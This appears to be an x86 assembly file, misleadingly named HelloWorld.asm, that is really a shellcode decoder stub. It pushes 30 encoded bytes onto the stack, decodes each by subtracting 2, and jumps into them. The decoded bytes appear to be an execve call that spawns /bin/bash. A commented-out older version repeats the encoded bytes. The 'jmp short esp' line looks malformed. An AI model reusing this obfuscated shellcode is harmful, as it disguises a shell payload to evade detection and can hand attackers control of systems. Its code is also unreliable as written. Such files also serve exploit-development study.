; HelloWorld.asm
; Author: TrulyOutrageous

global _start

section .text
_start:

	;push ebp
	;mov ebp, esp
	;sub esp, 32

	; push the encoded shellcode onto the stack
        push 0x909082cf
        push 0x0db2e38b
        push 0x55e48b52
        push 0xe58b3131
        push 0x31316a31
        push 0x706b646a
        push 0x6a756364
        push 0x6a52c233


	; move the memory address to encoded shellcode, which is the location of ESP, into esi
	mov esi, esp
	
	; set up the counter. The shellcode is 30 bytes long, so set the counter to 30 
	xor ecx,ecx
	mov cl,30

decode:
	; this will subtract the encoded byte by the amount rotated by the encoder
	sub byte [esi], 0x2 ; replace 0x2 with the number you used to encode with
	inc esi
	loop decode

	jmp short esp ; jump to the shellcode


; this is all old shellcode from the previous encoder assembly

;call_decoder:
	; call the decoder section of the code. This puts memory location of the encoded shellcode on the stack
;	call decoder
	; Place the shellcode bytes in memory using define bytes. This will need to be decoded
;	shellcode: db 0x33,0xc2,0x52,0x6a,0x64,0x63,0x75,0x6a,0x6a,0x64,0x6b,0x70,0x31,0x6a,0x31,0x31,0x31,0x31,0x8b,0xe5,0x52,0x8b,0xe4,0x55,0x8b,0xe3,0xb2,0x0d,0xcf,0x82
